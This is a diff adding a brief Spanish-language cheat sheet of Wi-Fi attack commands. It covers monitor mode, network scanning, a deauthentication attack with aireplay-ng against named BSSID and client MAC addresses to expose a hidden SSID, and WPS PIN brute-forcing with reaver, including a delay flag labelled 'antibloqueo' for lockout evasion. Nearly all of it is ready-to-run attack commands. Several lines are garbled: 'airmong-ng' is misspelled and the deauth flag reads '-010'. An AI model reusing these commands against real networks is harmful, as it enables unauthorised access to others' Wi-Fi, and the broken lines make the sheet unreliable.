@@ -1,0 +1,33 @@
+MODO MONITOR
+	sudo ifconfig wlan0 down
+		sudo airmong-ng start wlan0
+	sudo ifconfig wlan0 up 
+
+
+RECONOCIMIENTO PASIVO
+	sudo iw dev wlan0 scan passive | grep SSID
+REOCONOCIMIENTO ACTIVO
+	sudo iwlist wlan0 scan | grep SSID
+	
+MAPEAR REDES EN LINUX CON AIRODUMP-NG
+	sudo airodump-ng wlan0mon
+
+VER NOMBRE DE RED OCULTA
+       [captura] sudo airodump-ng --channel 1 --bssid 78:B4:6A:68:F5:88 wlan0mon
+	
+       [ataque]	sudo aireplay-ng -010 -a 78:B4:6A:68:F5:88  -c 18:70:3B:94:C9:9F wlan0mon
+
+VER REDES CON WPS ACTIVADO
+	sudo iw wlan0 scan | egrep 'WPS|BSS|SSID' -w
+	sudo wash -i wlan0mon --ignore-fcs
+ATACAR REDES WPS
+	sudo reaver -b 10:50:72:DF:C5:85 -i wlan0mon
+	sudo reaver -b 10:50:72:DF:C5:85 -r3:30 -i wlan0mon ---> antibloqueo
+
+ACTIVAR NUEVAMENTE SERVICIOS DE RED
+	sudo service network-manager start
+	sudo service avahi-daemon start
+CONECTARSE NUEVAMENTE A WIFI
+	sudo ifconfig wlan0 down
+	sudo iwconfig wlan0 mode managed
+	sudo ifconfig wlan0 up	
